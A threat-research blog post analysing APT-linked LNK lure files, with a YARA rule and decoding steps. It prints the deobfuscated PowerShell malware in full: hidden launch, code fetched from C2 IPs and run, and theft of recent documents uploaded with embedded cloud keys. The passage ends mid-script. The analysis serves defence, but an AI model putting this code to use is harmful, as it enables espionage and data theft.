3. 该组织私有木马包含繁体字符，某PowerShell脚本会判断系统语言是否为日语、繁体、简体和英语，最新的某攻击样本中隐藏的用于嘲讽安全研究者的图片也包含繁体字符。此外，一些钓鱼邮件和诱饵文件的内容也说明攻击者的汉语水平较高，再结合该组织攻击目标也多与亚太地缘政治有关等信息，推测该组织可能具备亚太地缘政治背景。
图：历史样本中包含的繁体字符In July 2018, the Chinese-based research group 360 Technical Intelligence Center (TIC) produced a report “蓝宝菇（APT-C-12）针对性攻击技术细节揭秘” (Sapphire Mushroom (APT-C-12) Technical Details Revealed 1 ). This report analysed a malicious LNK file allegedly used by the APT group “Sapphire Mushroom” (蓝宝菇 aka Blue Mushroom aka NuclearCrisis). The group, according to 360 TIC :
…has carried out continuous cyber espionage activities on key units and departments of the Chinese government, military industry, scientific research, and finance. The organization focuses on information related to the nuclear industry and scientific research. The targets were mainly concentrated in mainland China…[M]ore than 670 malware samples have been collected from the group, including more than 60 malicious plugins specifically for lateral movement; more than 40 C2 domain names and IPs related to the organization have also been discovered.
The group appeared in March 2011 and appears to be targeting a wide variety of Chinese government and industries with spear-phishing emails. An early tactic used right-to-left override (RTLO or RLO) character to give the appearance of a regular file, and also malicious LNK files.
There is limited background I can find publicly on this group. They are not listed by that name or any variant on the APT Groups and Operations Spreadsheet . I also don’t have access to much private threat intelligence to trawl against. 360 TIC does not make a country attribution (that I can find) in its reports.
What is publicly written is singled-sourced from 360 TIC and helpfully translated by @Viking_Sec
It’s the ‘L’ to the ‘N’ to the ‘K’
Flash-forward to January 2020 and I was trawling through Hybrid-Analysis searching for interesting LNK files, I came across these five samples:
Analysis indicates one of these samples is very similar to the same analysed in the 360 TIC report (of which the hash was not released) and the other four were previously unreported. Further, looking at the samples it is possible targets can be identified based on the malware - although this is not confirmed at this time.
So, with a combination of thread-pulling and reviewing the original 360 TIC report we can look at how these samples are related and any further information that might be interesting.
The Famous Five (LNKs)
What immediately stood out to me was the enormous size of these LNK files: between 400KB to 1.3 MB. Which is massive for such a (normally) little file. This generally indicates data is appended to the end of the file. If it’s larger than normal then it’s often a PE executable that is simply extracted out. How wrong I was.
What was also interesting is all of these samples were Chinese-language named and uploaded to Hybrid-Analysis at about the same time. The summary is as follows:
Date of Upload
File Name
Google Translation
SHA256 Hash
陈婧简历+作品.lnk
Chen Jing's resume + works
20ad6fa72982a6ba0f9499361b2aa3a3f5cca73fd397c2969d08a4c5f2866814
October 29th 2019 11:03:47 (UTC)
周文重：2018博鳌亚洲论坛感谢函.lnk
Zhou Wenzhong: Thank you letter for Boao Forum for Asia 2018
b0d7118d75c0f2a99fa5b319148b89148800e5db06ee403d6a31c451a8a54f2b
【2018前海合作论坛】.lnk
Qianhai Cooperation Forum 2018
70b6961af57bce72b89103197c8897a4ae3ce5fdb835ccd050f24acbac52900d
October 29th 2019 12:40:33 (UTC)
《政法网络舆情》会员申请.lnk
"Politics and Law Network Public Opinion" Member Application
ea6e7c9b9110c7c21062908be51dd3f881490b40b9b77a534fdc7812ab5cd2af
October 29th 2019 12:40:54 (UTC)
《观察者网》采访提纲暨相关新闻附件.lnk
"Observer Network" Interview Outline and Related News Attachments
6ccad83fb9f7a50ac95e3e865a27be0288279e76fcd3b5af495c6fcf6d58fa36
The second-last sample (SHA256 ea6e7c9b9110c7c21062908be51dd3f881490b40b9b77a534fdc7812ab5cd2af) is very similar to that analysed in the 360 TIC report. This is based on basic characteristics including: filename, file size, reported strings, reported C2 and exfiltration domains, and secondary dropped malware.
A Quick Comparison
Running the five samples through Eric Zimmerman’s LECMD and comparing their overall hex content indicated they were likely related. Points of interest included:
All had much of their metadata wiped including internal dates and times, MAC addresses, and Volume Serial Numbers. This itself is an anomaly that is a useful tool mark to match samples.
What wasn’t wiped was the Security Identifier (SID) for each of the LNK files which indicated the user account from which the LNK file was created:
20ad6fa72982a6ba0f9499361b2aa3a3f5cca73fd397c2969d08a4c5f2866814
S-1-5-21-768223713-132671932-3453716105-7998
b0d7118d75c0f2a99fa5b319148b89148800e5db06ee403d6a31c451a8a54f2b
S-1-5-21-768223713-132671932-3453716105-8001
70b6961af57bce72b89103197c8897a4ae3ce5fdb835ccd050f24acbac52900d
S-1-5-21-768223713-132671932-3453716105-7998
ea6e7c9b9110c7c21062908be51dd3f881490b40b9b77a534fdc7812ab5cd2af
S-1-5-21-768223713-132671932-3453716105-7998
6ccad83fb9f7a50ac95e3e865a27be0288279e76fcd3b5af495c6fcf6d58fa36
S-1-5-21-768223713-132671932-3453716105-7998
So, all the samples were created on the same Windows environment and all but one was created with the same user account. Maybe they let the intern have a go?
This would be a good Yara rule to start a hunt:
rule LNK_Based_on_SID
meta:
sample = "70b6961af57bce72b89103197c8897a4ae3ce5fdb835ccd050f24acbac52900d"
author = "@mattnotmax"
date = "2020-01-23"
strings:
$SID = "S-1-5-21-768223713-132671932-3453716105" wide
condition:
filesize > 400KB and
uint16(0) == 0x4c and
Only one sample (70b6961af57bce72b89103197c8897a4ae3ce5fdb835ccd050f24acbac52900d) had been uploaded to Virus Total about the same time as the Hybrid-Analysis uploads: 29 October 2019 at 12:43:22 UTC. At the time of writing it registered 16/58 detections, but all were non-specific Trojan detections.
Malicious Script Delivery
All the LNK files also have similar PowerShell delivery: a plethora of white space to hide a PowerShell encoded commanded from the user, followed by a Base64 encoded script.
The five payloads are:
-w hidden $r = 'LWpvaW4oKDM2LDU3LDYxLDM2LDEwNCwxMTEsMTE1LDExNiw0NiwxMTcsMTA1LDQ2LDExNCw5NywxMTksMTE3LDEwNSw0NiwxMTksMTA1LDExMCwxMDAsMTExLDExOSwxMTYsMTA1LDExNiwxMDgsMTAxLDU5LDczLDEwMiw0MCwzMywzNiw1Nyw0NiwxMDEsMTEwLDEwMCwxMTUsMTE5LDEwNSwxMTYsMTA0LDQwLDM5LDQ2LDEwOCwxMTAsMTA3LDM5LDQxLDQxLDEyMywzNiw1Nyw0Myw2MSwzOSw0NiwxMDgsMTEwLDEwNywzOSwxMjUsMzYsNTcsNjEsMTAzLDEwNSwzMiwzNiw1Nyw1OSwxMDgsMTA5LDU2LDMyLDQwLDEwMyw5OSwzMiwzNiw1NywxMjQsMTE1LDEwMSwxMDgsMTAxLDk5LDExNiwzMiw0NSwxMDgsMzIsNDksNDEpfCV7W2ludF0kXy1BU1tjaGFyXX0pfGlleA==' ; Function lm8{ param ( $v );iex ([text.encoding]::utf8.getstring([convert]::frombase64string( $v )))}lm8 $r
-w hidden $6 = 'LWpvaW4oKDM2LDQ5LDYxLDM2LDEwNCwxMTEsMTE1LDExNiw0NiwxMTcsMTA1LDQ2LDExNCw5NywxMTksMTE3LDEwNSw0NiwxMTksMTA1LDExMCwxMDAsMTExLDExOSwxMTYsMTA1LDExNiwxMDgsMTAxLDU5LDczLDEwMiw0MCwzMywzNiw0OSw0NiwxMDEsMTEwLDEwMCwxMTUsMTE5LDEwNSwxMTYsMTA0LDQwLDM5LDQ2LDEwOCwxMTAsMTA3LDM5LDQxLDQxLDEyMywzNiw0OSw0Myw2MSwzOSw0NiwxMDgsMTEwLDEwNywzOSwxMjUsMzYsNDksNjEsMTAzLDEwNSwzMiwzNiw0OSw1OSwxMTksMTE0LDQ5LDMyLDQwLDEwMyw5OSwzMiwzNiw0OSwxMjQsMTE1LDEwMSwxMDgsMTAxLDk5LDExNiwzMiw0NSwxMDgsMzIsNDksNDEpfCV7W2ludF0kXy1BU1tjaGFyXX0pfGlleA==' ; Function wr1{ param ( $3 );iex ([text.encoding]::utf8.getstring([convert]::frombase64string( $3 )))}wr1 $6
-w hidden $3 = 'LWpvaW4oKDM2LDUwLDYxLDM2LDEwNCwxMTEsMTE1LDExNiw0NiwxMTcsMTA1LDQ2LDExNCw5NywxMTksMTE3LDEwNSw0NiwxMTksMTA1LDExMCwxMDAsMTExLDExOSwxMTYsMTA1LDExNiwxMDgsMTAxLDU5LDczLDEwMiw0MCwzMywzNiw1MCw0NiwxMDEsMTEwLDEwMCwxMTUsMTE5LDEwNSwxMTYsMTA0LDQwLDM5LDQ2LDEwOCwxMTAsMTA3LDM5LDQxLDQxLDEyMywzNiw1MCw0Myw2MSwzOSw0NiwxMDgsMTEwLDEwNywzOSwxMjUsMzYsNTAsNjEsMTAzLDEwNSwzMiwzNiw1MCw1OSwxMTAsNDgsNDgsMzIsNDAsMTAzLDk5LDMyLDM2LDUwLDEyNCwxMTUsMTAxLDEwOCwxMDEsOTksMTE2LDMyLDQ1LDEwOCwzMiw0OSw0MSl8JXtbaW50XSRfLUFTW2NoYXJdfSl8aWV4' ; Function n00{ param ( $z );iex ([text.encoding]::utf8.getstring([convert]::frombase64string( $z )))}n00 $3
-w hidden $5 = 'LWpvaW4oKDM2LDEwMSw2MSwzNiwxMDQsMTExLDExNSwxMTYsNDYsMTE3LDEwNSw0NiwxMTQsOTcsMTE5LDExNywxMDUsNDYsMTE5LDEwNSwxMTAsMTAwLDExMSwxMTksMTE2LDEwNSwxMTYsMTA4LDEwMSw1OSw3MywxMDIsNDAsMzMsMzYsMTAxLDQ2LDEwMSwxMTAsMTAwLDExNSwxMTksMTA1LDExNiwxMDQsNDAsMzksNDYsMTA4LDExMCwxMDcsMzksNDEsNDEsMTIzLDM2LDEwMSw0Myw2MSwzOSw0NiwxMDgsMTEwLDEwNywzOSwxMjUsMzYsMTAxLDYxLDEwMywxMDUsMzIsMzYsMTAxLDU5LDExNSwxMDYsNTUsMzIsNDAsMTAzLDk5LDMyLDM2LDEwMSwxMjQsMTE1LDEwMSwxMDgsMTAxLDk5LDExNiwzMiw0NSwxMDgsMzIsNDksNDEpfCV7W2ludF0kXy1BU1tjaGFyXX0pfGlleA==' ; Function sj7{ param ( $z );iex ([text.encoding]::utf8.getstring([convert]::frombase64string( $z )))}sj7 $5
-w hidden $o = 'LWpvaW4oKDM2LDk3LDYxLDM2LDEwNCwxMTEsMTE1LDExNiw0NiwxMTcsMTA1LDQ2LDExNCw5NywxMTksMTE3LDEwNSw0NiwxMTksMTA1LDExMCwxMDAsMTExLDExOSwxMTYsMTA1LDExNiwxMDgsMTAxLDU5LDczLDEwMiw0MCwzMywzNiw5Nyw0NiwxMDEsMTEwLDEwMCwxMTUsMTE5LDEwNSwxMTYsMTA0LDQwLDM5LDQ2LDEwOCwxMTAsMTA3LDM5LDQxLDQxLDEyMywzNiw5Nyw0Myw2MSwzOSw0NiwxMDgsMTEwLDEwNywzOSwxMjUsMzYsOTcsNjEsMTAzLDEwNSwzMiwzNiw5Nyw1OSwxMTMsNTQsNTIsMzIsNDAsMTAzLDk5LDMyLDM2LDk3LDEyNCwxMTUsMTAxLDEwOCwxMDEsOTksMTE2LDMyLDQ1LDEwOCwzMiw0OSw0MSl8JXtbaW50XSRfLUFTW2NoYXJdfSl8aWV4' ; Function q64{ param ( $6 );iex ([text.encoding]::utf8.getstring([convert]::frombase64string( $6 )))}q64 $o
When converted from Base64 there is another layer of CharCode (Unicode character numbers):
-join(( 36 , 57 , 61 , 36 , 104 , 111 , 115 , 116 , 46 , 117 , 105 , 46 , 114 , 97 , 119 , 117 , 105 , 46 , 119 , 105 , 110 , 100 , 111 , 119 , 116 , 105 , 116 , 108 , 101 , 59 , 73 , 102 , 40 , 33 , 36 , 57 , 46 , 101 , 110 , 100 , 115 , 119 , 105 , 116 , 104 , 40 , 39 , 46 , 108 , 110 , 107 , 39 , 41 , 41 , 123 , 36 , 57 , 43 , 61 , 39 , 46 , 108 , 110 , 107 , 39 , 125 , 36 , 57 , 61 , 103 , 105 , 32 , 36 , 57 , 59 , 108 , 109 , 56 , 32 , 40 , 103 , 99 , 32 , 36 , 57 , 124 , 115 , 101 , 108 , 101 , 99 , 116 , 32 , 45 , 108 , 32 , 49 , 41 )|%{[int] $_ -AS[char]})|iex
-join(( 36 , 49 , 61 , 36 , 104 , 111 , 115 , 116 , 46 , 117 , 105 , 46 , 114 , 97 , 119 , 117 , 105 , 46 , 119 , 105 , 110 , 100 , 111 , 119 , 116 , 105 , 116 , 108 , 101 , 59 , 73 , 102 , 40 , 33 , 36 , 49 , 46 , 101 , 110 , 100 , 115 , 119 , 105 , 116 , 104 , 40 , 39 , 46 , 108 , 110 , 107 , 39 , 41 , 41 , 123 , 36 , 49 , 43 , 61 , 39 , 46 , 108 , 110 , 107 , 39 , 125 , 36 , 49 , 61 , 103 , 105 , 32 , 36 , 49 , 59 , 119 , 114 , 49 , 32 , 40 , 103 , 99 , 32 , 36 , 49 , 124 , 115 , 101 , 108 , 101 , 99 , 116 , 32 , 45 , 108 , 32 , 49 , 41 )|%{[int] $_ -AS[char]})|iex
-join(( 36 , 50 , 61 , 36 , 104 , 111 , 115 , 116 , 46 , 117 , 105 , 46 , 114 , 97 , 119 , 117 , 105 , 46 , 119 , 105 , 110 , 100 , 111 , 119 , 116 , 105 , 116 , 108 , 101 , 59 , 73 , 102 , 40 , 33 , 36 , 50 , 46 , 101 , 110 , 100 , 115 , 119 , 105 , 116 , 104 , 40 , 39 , 46 , 108 , 110 , 107 , 39 , 41 , 41 , 123 , 36 , 50 , 43 , 61 , 39 , 46 , 108 , 110 , 107 , 39 , 125 , 36 , 50 , 61 , 103 , 105 , 32 , 36 , 50 , 59 , 110 , 48 , 48 , 32 , 40 , 103 , 99 , 32 , 36 , 50 , 124 , 115 , 101 , 108 , 101 , 99 , 116 , 32 , 45 , 108 , 32 , 49 , 41 )|%{[int] $_ -AS[char]})|iex
-join(( 36 , 101 , 61 , 36 , 104 , 111 , 115 , 116 , 46 , 117 , 105 , 46 , 114 , 97 , 119 , 117 , 105 , 46 , 119 , 105 , 110 , 100 , 111 , 119 , 116 , 105 , 116 , 108 , 101 , 59 , 73 , 102 , 40 , 33 , 36 , 101 , 46 , 101 , 110 , 100 , 115 , 119 , 105 , 116 , 104 , 40 , 39 , 46 , 108 , 110 , 107 , 39 , 41 , 41 , 123 , 36 , 101 , 43 , 61 , 39 , 46 , 108 , 110 , 107 , 39 , 125 , 36 , 101 , 61 , 103 , 105 , 32 , 36 , 101 , 59 , 115 , 106 , 55 , 32 , 40 , 103 , 99 , 32 , 36 , 101 , 124 , 115 , 101 , 108 , 101 , 99 , 116 , 32 , 45 , 108 , 32 , 49 , 41 )|%{[int] $_ -AS[char]})|iex
-join(( 36 , 97 , 61 , 36 , 104 , 111 , 115 , 116 , 46 , 117 , 105 , 46 , 114 , 97 , 119 , 117 , 105 , 46 , 119 , 105 , 110 , 100 , 111 , 119 , 116 , 105 , 116 , 108 , 101 , 59 , 73 , 102 , 40 , 33 , 36 , 97 , 46 , 101 , 110 , 100 , 115 , 119 , 105 , 116 , 104 , 40 , 39 , 46 , 108 , 110 , 107 , 39 , 41 , 41 , 123 , 36 , 97 , 43 , 61 , 39 , 46 , 108 , 110 , 107 , 39 , 125 , 36 , 97 , 61 , 103 , 105 , 32 , 36 , 97 , 59 , 113 , 54 , 52 , 32 , 40 , 103 , 99 , 32 , 36 , 97 , 124 , 115 , 101 , 108 , 101 , 99 , 116 , 32 , 45 , 108 , 32 , 49 , 41 )|%{[int] $_ -AS[char]})|iex
The above two rounds of obfuscation can be decoded using CyberChef goodness:
[{ "op" : "Regular expression" , "args" :[ "User defined" , "[a-zA-Z0-9+=/]{30,}" ,true,true,false,false,false,false, "List matches" ]},{ "op" : "Fork" , "args" :[ "\\n" , "\\n\\n\\n" ,false]},{ "op" : "From Base64" , "args" :[ "A-Za-z0-9+/=" ,true]},{ "op" : "Regular expression" , "args" :[ "User defined" , "([0-9]{2,3})" ,true,true,false,false,false,false, "List matches" ]},{ "op" : "Find / Replace" , "args" :[{ "option" : "Extended (\\n, \\t, \\x...)" , "string" : "\\n" }, ", " ,true,false,true,false]},{ "op" : "From Charcode" , "args" :[ "Comma" , 10 ]}]
This reveals:
$9 = $host .ui.rawui.windowtitle; If (! $9 .endswith( '.lnk' )){ $9 += '.lnk' } $9 =gi $9 ;lm8 (gc $9 |select -l 1 )
$1 = $host .ui.rawui.windowtitle; If (! $1 .endswith( '.lnk' )){ $1 += '.lnk' } $1 =gi $1 ;wr1 (gc $1 |select -l 1 )
$2 = $host .ui.rawui.windowtitle; If (! $2 .endswith( '.lnk' )){ $2 += '.lnk' } $2 =gi $2 ;n00 (gc $2 |select -l 1 )
$e = $host .ui.rawui.windowtitle; If (! $e .endswith( '.lnk' )){ $e += '.lnk' } $e =gi $e ;sj7 (gc $e |select -l 1 )
$a = $host .ui.rawui.windowtitle; If (! $a .endswith( '.lnk' )){ $a += '.lnk' } $a =gi $a ;q64 (gc $a |select -l 1 )
All of these do the same thing: check the title text in the current window, rename that text to end in .lnk if needed, then select the last line of the LNK file and extract it.
Babushka (LNK) Dolls
Extracting out the last line of the LNK files reveals more Base64 encoded CharCode. Due to the length, I’ll copy one sample here and the same CyberChef recipe can quickly deal with it:
Here’s the extracted and semi-clean PowerShell from sample 70b6961af57bce72b89103197c8897a4ae3ce5fdb835ccd050f24acbac52900d:
[io.file]::writeallbytes( " $env:tmp \xgihT.Z" ,[convert]::frombase64string((gc $2 |select -l 2 |select -f 1 )));
expand /f:* " $env:tmp \xgihT.Z" " $env:tmp \" ;
del -fo " $env:tmp \xgihT.Z" ;
If ( test-path $env:tmp \xgihT) {
del -fo -r " $env:tmp \xgihT"
rni -fo " $env:tmp \tmp" "xgihT" ;
md -fo " $env:AppData \WinRAR" ;
mv -fo " $env:tmp \xgihT\Rar.exe" " $env:AppData \WinRAR\" ;
mv -fo " $env:tmp \xgihT\FLrzH.w" " $env:tmp \..\" ;
If ( $2 .fullname.startswith( $env:tmp )) {
del -fo -r ( " $env:tmp \" + $2 .basename);
rni -fo " $env:tmp \xgihT" $2 .basename;
ii ( " $env:tmp \" + $2 .basename+ "\" )
Else {
del -fo $2 ;
md -fo $2 .basename;
mv -fo " $env:tmp \xgihT\*" $2 .basename;
del -fo -r " $env:tmp \xgihT" ;
ii "$( $2 .basename)\"
If ( test-path $env:tmp \backups) {
If ((( get-date )-( get-item $env:tmp \backups).LastAccessTime).totalminutes -le 60 ) {
del -fo -r " $env:tmp \backups"
If ( test-path " $env:tmp \..\FLrzH.w" ) {
rundll32 " $env:tmp \..\FLrzH.w" ,DllRegister `
"powershell -w hidden `
" "Function we8([String]`$3,`$7='MD5'){`$g=New-Object System.Text.StringBuilder;`
`$9=[System.Security.Cryptography.HashAlgorithm]::Create(`$7).ComputeHash([System.Text.Encoding]::UTF8.GetBytes(`$3));`
foreach(`$1 in `$9) {`
[Void]`$g.Append(`$1.ToString('x2'))`
`$w=`$g.ToString();`
`$e=`$w.substring(0,12);`
return `$e}`
Function qv1 (`$3) {`
`$w=[System.Text.Encoding]::UTF8;`
`$x=`$w.GetBytes('s');`
`$s=`$(for(`$e=0;`
`$e -lt `$3.length;) {`
for(`$g=0;`$g -lt `$x.length;`$g++) {`
`$3[`$e] -bxor `$x[`$g];`
`$e++;If(`$e -ge `$3.Length) {`
`$g=`$x.length`
}`);`
`$7=`$w.GetString(`$s);`
return `$7`
Function qc4 {`
`$s=0;`
`$q=`$m.length;`
while (1) {`
`$w=@();`
`$7=Get-WmiObject win32_networkadapterconfiguration;`
foreach(`$zv7 in `$7) {`
If(`$zv7.macaddress) {`
`$w+=`$zv7.macaddress`
`$zv7=@();`
foreach(`$ij4 in `$w) {`
If(`$ij4.contains(':')) {`
`$zv7+=`$ij4.substring(0,17) -replace ':',''`
`$zv7=`$zv7|sort;`
`$zy3=we8 (`$zv7[-1]+`$env:username);`
`$xi2=new-object System.Net.WebClient;`
`$xi2.headers.add('user-agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like DA) Chrome/62.0.3202.94 Safari/.36');`
`$xi2.headers.add('Cookie','PHPSESSID='+`$zy3+'; csrftoken=u32t4o3tb3lbj'+`$v+'; _gat='+`$u+';');`
try {`
`$0=`$xi2.DownloadString(`$m[`$s]);`$ri8=`$0.split(' ');`
`$jd4= `$ri8.Length;`
`$qw2=new-object int[] `$jd4;`
for(`$e=0;`$e -lt `$jd4;`$e+=1) {`
`$qw2[`$e]=[int]`$ri8[`$e]`
`$0=qv1 `$qw2;iex `$0;`
while(1) {`
try {`
ROAGC `$8 `$u `$m `$a `$zy3`
catch {}`
catch {`
If(`$s -lt (`$q-1)) {`
`$s+=1`
Else {`
`$s=0`
Start-Sleep -s 180`
`$v='';`
`$0=[System.Text.Encoding]::Default.EncodingName;`
If(`$0.endswith('jis)')) {`
`$v='5'`
Elseif(`$0.endswith('f-16)')) {`
`$v='4'`
Elseif(`$0.endswith('M437)')) {`
`$v='3'`
Elseif(`$0.endswith('g5)')) {`
`$v='1'`
Elseif(`$0.endswith('12)')) {`
`$v='0'`
Else {`$v='2'}`
`$0='http://159.65.74.97;http://159.65.127.93;http://128.199.73.43';`
`$m=`$0.split(';');`
`$a='o19JOAiPTbSozNpAcIRYRy20E/sAYzrJxFzmsAQTbBo=';`
`$u='REDACTED';`
`$8=10;`
`$0=-join(get-random ([char[]](65..90+97..122)) -c 7 -s `$([int](get-date -f yyyMd)));`
`$nl7=new-object system.threading.mutex(0,`$0);`
If (`$nl7.waitone(1)) {`
try {`
finally {`
`$nl7.releasemutex()`
" ""
md -fo " $env:tmp \backups" ;
Function u65( $9 ) {
[system.gc]::collect();
$6 =[System.Net.WebRequest]::Create( $9 .Uri1);
$6 .proxy= $Null ;
$6 .keepalive= $False ;
$6 .Method= $9 .Method1;
If ( $9 .Header2.count) {
foreach ( $1 in $9 .Header2.getenumerator()) {
If ( $1 .name) {
$6 .Headers.Add( $1 .name, $1 .value)
$6 .AllowAutoRedirect= $False ;
$6 .ContentLength= $9 .Body.Length;
$x = $6 .GetRequestStream();
$x .Write( $9 .Body, 0 , $9 .Body.Length);
$t = $6 .GetResponse();
If ( $9 .GData) {
$r = $t .GetResponseStream();
$e = New-Object System.IO.StreamReader $r ;
$n = $e .ReadToEnd()
If ( $t -ne $Null ) {
$t .close()
If ( $6 -ne $Null ) {
$6 .abort()
If ( $9 .GData) {
return ( $t .statuscode,([xml] $n ).InitiateMultipartUploadResult.UploadId)
return $t
Function v95( $2 , $p ) {
$e = New-Object System.Security.Cryptography.HMACSHA256;
$e .key= $2 ; $2 = $e .ComputeHash([Text.Encoding]::utf8.GetBytes( $p ));
return $2
Function y79( $p ) {
$9 =[Security.Cryptography.HashAlgorithm]::Create( "SHA256" );
$4 =[Text.Encoding]::utf8.GetBytes( $p );
$h = $9 .ComputeHash( $4 );
return -join( $h | % { "{0:x2}" -f $_ })
Function ww2( $9 ) {
$c = '/' ;
If ( $9 .DIRNAME) {
$c += "$( $9 .DIRNAME)/"
If ( $9 .FILENAME) {
$c += $9 .FILENAME} $5 = '' ;
( $9 .CANON_HEAD.keys | sort) | % { $5 += "$( $_ ):$( $9 .CANON_HEAD[ $_ ])`n" };
$0 = "$( $9 .METHOD)`n $c `n$( $9 .QUERYS)`n $5 `n$( $9 .SIGNHEAD)`n$( $9 .BODY_SIG)" ;
return "AWS4-HMAC-SHA256`n$( $9 .ISODATE)`n$( $9 .DATE)/$( $9 .REGION)/s3/aws4_request`n$(y79 $0 )"
Function i09( $9 ) {
$c =[convert]::frombase64string( '+ji52ydI8GAan3Xej2sIhMfPEEATEQjehjYt2Nh+ZqQ=' );
$7 =v95 $c $9 .REGION; $i =v95 $7 "s3" ;
$s =v95 $i "aws4_request" ;
$2 =v95 $s $9 .CANON_REQ; return -join( $2 |%{ "{0:x2}" -f $_ })
Function en2( $9 , $6 , $7 ) {
$9 .ISODATE= '20180621T015829Z' ;
$9 .DATE= $9 .ISODATE.split( 'T' )[ 0 ]; $9 .CANON_HEAD=@{ "host" = $9 .HOSTURL; "x-amz-content-sha256" = $9 .BODY_SIG; "x-amz-date" = $9 .ISODATE};
If ( $9 .FileMD5) {
$9 .CANON_HEAD.add( 'content-md5' , $9 .FileMD5)
$9 .SIGNHEAD=( $9 .CANON_HEAD.keys|sort) -join ';' ;
$9 .CANON_REQ=ww2 $9 ; $9 .CANON_SIG=i09 $9 ;
$t =@{ "x-amz-content-sha256" = $9 .BODY_SIG; "x-amz-date" = $9 .ISODATE; "Authorization" = "AWS4-HMAC-SHA256 Credential=$( $9 .ACCESS_KEY)/$( $9 .DATE)/$( $9 .REGION)/s3/aws4_request, SignedHeaders=$( $9 .SIGNHEAD), Signature=$( $9 .CANON_SIG)" }; If ( $9 .FileMD5){ $t .add( 'content-md5' , $9 .FileMD5)} $x = "https://$( $9 .HOSTURL)/" ;
If ( $9 .DIRNAME) {
$x += "$( $9 .DIRNAME)/"
If ( $9 .FILENAME) {
$x += $9 .FILENAME
If ( $9 .QUERYS) {
$x += "?$( $9 .QUERYS)"
$b =@{Uri1= $x ;Body= $6 ;Method1= $9 .METHOD;Header2= $t ;GData= $7 };
return $b
Function ts3( $l , $x , $t ) {
$9 =@{METHOD= 'POST' ;HOSTURL= '05012.ams3.digitaloceanspaces.com' ;ACCESS_KEY= 'BVTTZPQUDF3W4Z7P3WTN' ;REGION= 'nyc3' ;DIRNAME= $x ;FILENAME= $t .tostring()+ $l .extension};
$3 = $False ;
$g = $False ;
try {
$f = New-Object System.IO.FileStream $l .fullname, 'Open' ;
If ( $f .Length -gt 5 Mb) {
$g = $True ;
$i = New-Object System.Xml.XmlDocument;
$4 = $i .Createelement( 'CompleteMultipartUpload' );
$9 .QUERYS= 'uploads=' ;
$9 .BODY_SIG=y79 '' ;
$b =en2 $9 '' $True ;
$0 =u65 $b ;
$n =[int] $0 [ 0 ];
$x = $0 [ 1 ]
catch {}
If ( $n -eq 200 -or -not $g ) {
$t = 0 ;
$o = 0 ;
$h = 1 ;
$2 = 5 Mb;
try {
[byte[]] $6 = New-Object byte[] $2 ;
while ( $o -le 10 ) {
$o += 1 ;
$w =[Math]::Min( $2 , $f .Length- $t );
If ( $w -lt $2 ) {
[byte[]] $6 = New-Object byte[] $w
$q = $f .Read( $6 , 0 , $w );
If ( $q -ne $w ) {
break
$q = New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider;
$9 .METHOD= 'PUT' ;
$9 .BODY_SIG= 'UNSIGNED-PAYLOAD' ;
$9 .FileMD5=[convert]::tobase64string( $q .ComputeHash( $6 ));
If ( $g ) {
$9 .QUERYS= "partNumber= $h &uploadId= $x "
$b =en2 $9 $6 $False ;
$0 =u65 $b ;
$n =[int] $0 .StatusCode;
If ( $n -eq 200 ) {
If ( $g ) {
$q = $i .Createelement( 'Part' );
$p = $i .Createelement( 'PartNumber' );
$p .innertext= $h ;
[void] $q .appendchild( $p );
$6 = $i .Createelement( 'ETag' );
$6 .innertext= $0 .Headers[ 'etag' ];
[void] $q .appendchild( $6 );
[void] $4 .appendchild( $q );
$h += 1 ;
$t += $w
else {
$3 = $True
If ( $t -eq $f .Length) {
break
else {
If ( $f .Position -ne $t ) {
[void] $f .Seek( $t ,[System.IO.SeekOrigin]:: Begin )
If ( $g ) {
$9 .METHOD= 'POST' ;
$g =[byte[]][char[]] $4 .outerxml;
$9 .BODY_SIG=y79 $4 .outerxml;
$9 .QUERYS= "uploadId= $x " ;
$9 .FileMD5= '' ;
$b =en2 $9 $g $False ;
$0 =u65 $b ;
If ([int] $0 .StatusCode -eq 200 ) {
$3 = $True
catch {
$f .Close();
$f .Dispose();
return $3
Function x56( $6 , $g , $f ) {
iex ( "& ' $env:AppData \WinRAR\Rar.exe' a -ep1 -y -hp $6 ' $g ' ' $f '" ) | out-null ;
If (!( test-path $g )) {
makecab " $f " " $g " | out-null
Function zm7( $l , $n , $g , $y , $x ) {
$s = "[" + $g + "] " +( $l .fullName)+ " Size:" +( $l .Length/ 1 kb)+ "KB Time:" +( $l .LastWriteTime);
Try {
gc $l .fullname -fo -total 0 -erroraction stop;
$7 = $True ;
If ( $l .extension -eq '.txt' -and $l .Length -gt 10 KB) {
$7 = $False
If ( $n -eq $_ .Length) {
$7 = $False
If ( $l .Length -le 100 MB -and $l .Length -gt 0 -and $7 ) {
$9 = " $env:tmp \backups\ $g .rar" ;
x56 $j $9 $l .fullName;
If ( test-path $9 ) {
$9 =gi -fo $9
Else {
$9 = $l
If (ts3 $9 $x $y ) {
$s += " ( $y )OK`r`n" ;
sleep -s 1
Else {
$s += " (Error)`r`n"
If ( $9 .extension -eq '.rar' ) {
del -fo $9 .fullname
Else {
$s += "[!Size or Duplicate!]`r`n"
Catch {
$s += "[!Access denied!!]`r`n"
return $s
Function sr2( $j , $x ) {
$6 = 180 ;
$y = 1 ;
$b = 0 ;
$e =( Get-Date -f yyyyMMddhhmmss)+ "`r`nWeek:`r`n" ;
$n = 0 ;
$f =( '.doc' , '.docx' , '.pdf' , '.ppt' , '.pptx' , '.xls' , '.xlsx' , '.wps' , '.wpp' , '.et' , '.txt' );
gci " $env:appdata \Microsoft\Windows\Recent\" -fo -errora silentlycontinue | ? { $f -contains [io.path]::getextension( $_ .basename) -and $_ .LastWriteTime -ge ( Get-Date ).AddDays(- 7 )} | % {gi (( new-object -com wscript.shell).createshortcut( $_ .fullname)).targetpath -fo -errora silentlycontinue} | % { $b += 1 ; $e +=zm7 $_ $n $b $y $x ; $n = $_ .Length;
If ( $e .endswith( "OK`r`n" )) {
$y += 1
$5 =@();
$5 +=gdr -p 'fi*' | ? { $_ .root -ne " $env:systemdrive \" } | % {gci -fo $_ .root};
$5 +=gci -fo " $env:systemdrive \users" ;
